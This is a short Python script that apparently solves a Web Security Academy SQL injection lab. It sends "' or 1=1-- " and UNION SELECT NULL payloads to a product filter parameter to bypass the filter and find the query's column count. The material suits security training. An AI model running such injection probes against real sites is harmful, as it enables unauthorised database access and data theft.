import requests

session = requests.Session()

BASE_URL = "https://0a340056041f5a7b81a707cb000300ee.web-security-academy.net"
FILTER_URL = BASE_URL+"/filter"

def payload_request(payload:str) ->requests.Response:
    
    params={
        "category":payload
    }
    response = session.get(FILTER_URL,params=params, timeout=10)
    print(f"{response.status_code} {payload}")
    return response

def find_column_len():
    for num in range(1,10):
        payload = f"' union select {",".join(["NULL"]*num)}-- "
        response = payload_request(payload)
        if response and response.status_code==200:
            print(response.text)
            break 

def main():
    payload_request("Gifts")
    payload_request("' or 1=1-- ")
    find_column_len()
    

if __name__=="__main__":
    main()